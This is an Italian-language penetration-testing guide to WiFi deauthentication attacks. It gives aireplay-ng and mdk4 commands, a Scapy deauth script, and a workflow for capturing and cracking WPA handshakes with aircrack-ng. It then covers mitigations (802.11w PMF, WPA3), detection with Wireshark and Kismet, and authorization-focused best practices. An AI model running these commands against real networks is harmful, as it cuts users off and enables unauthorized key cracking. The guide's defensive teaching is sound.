# Disassociation Attacks

## Scopo

Questa guida copre gli attacchi di disassociation/deauthentication WiFi, utilizzati per disconnettere client da access point legittimi, spesso come prerequisito per altri attacchi.

## Prerequisiti

- Scheda WiFi con supporto monitor mode e packet injection
- Kali Linux
- aircrack-ng suite
- **Autorizzazione scritta** per i test

## Installazione

```bash
sudo apt-get update
sudo apt-get install aircrack-ng mdk4
```

---

## Come Funziona

```
Deauth frame: Management frame non autenticato
- Client riceve frame con reason code
- Client si disconnette dall'AP
- Può riconnettersi (handshake catturabile)
```

---

## Aireplay-ng

### Setup

```bash
# Monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Identifica target
sudo airodump-ng wlan0mon
# Nota BSSID e STATION (client)
```

### Deauth Singolo Client

```bash
# -0 = deauth, 10 = numero pacchetti
sudo aireplay-ng -0 10 -a AP_BSSID -c CLIENT_MAC wlan0mon
```

### Deauth Broadcast

```bash
# Deauth tutti i client dell'AP
sudo aireplay-ng -0 0 -a AP_BSSID wlan0mon

# 0 = infinito (Ctrl+C per fermare)
```

### Deauth Continuo

```bash
# Per catturare handshake
sudo airodump-ng -c CHANNEL --bssid AP_BSSID -w capture wlan0mon &
sudo aireplay-ng -0 5 -a AP_BSSID wlan0mon
```

---

## MDK4

```bash
# Deauth mode
sudo mdk4 wlan0mon d -c CHANNEL

# Targeting specifico (whitelist)
echo "AP_BSSID" > whitelist.txt
sudo mdk4 wlan0mon d -w whitelist.txt

# Targeting specifico (blacklist)
echo "AP_BSSID" > blacklist.txt
sudo mdk4 wlan0mon d -b blacklist.txt
```

---

## Scapy

```python
from scapy.all import *

def deauth_attack(target_mac, ap_mac, iface, count=100):
    dot11 = Dot11(
        addr1=target_mac,  # Destination
        addr2=ap_mac,      # Source (AP)
        addr3=ap_mac       # BSSID
    )
    frame = RadioTap()/dot11/Dot11Deauth(reason=7)
    
    sendp(frame, iface=iface, count=count, inter=0.1)

# Uso
deauth_attack("CLIENT_MAC", "AP_MAC", "wlan0mon")
```

---

## Cattura Handshake WPA

```bash
# 1. Monitor su canale target
sudo airodump-ng -c 6 --bssid AP_BSSID -w handshake wlan0mon

# 2. Deauth per forzare riconnessione
sudo aireplay-ng -0 5 -a AP_BSSID wlan0mon

# 3. Attendi "WPA handshake: XX:XX:XX:XX:XX:XX" in airodump

# 4. Crack handshake
aircrack-ng -w wordlist.txt handshake-01.cap
```

---

## Mitigazioni

### 802.11w (PMF - Protected Management Frames)

```
- Firma crittografica su management frames
- Impedisce spoofing deauth
- Richiede WPA2/WPA3
```

### Configurazione AP

```
# Abilita PMF (opzionale)
ieee80211w=1

# PMF obbligatorio
ieee80211w=2
```

### WPA3

- PMF obbligatorio
- SAE invece di PSK
- Resistente a offline attacks

---

## Detection

### Wireshark

```
# Filtra deauth frames
wlan.fc.type_subtype == 0x0c

# Molti deauth = possibile attacco
```

### WIDS

```bash
# Kismet può rilevare deauth floods
kismet -c wlan0mon
```

---

## Best Practices

- **Solo test autorizzati**: Deauth è illegale senza permesso
- **Impatto minimo**: Limita durata e scope
- **Documentazione**: Log completo attività
- **Responsabilità**: Considera impatto su servizi critici
- **Legal**: Verifica normative locali (spesso illegale)

## Riferimenti

- [Aircrack-ng Documentation](https://www.aircrack-ng.org/documentation.html)
- [802.11w Standard](https://standards.ieee.org/standard/802_11w-2009.html)
- [MDK4 GitHub](https://github.com/aircrack-ng/mdk4)
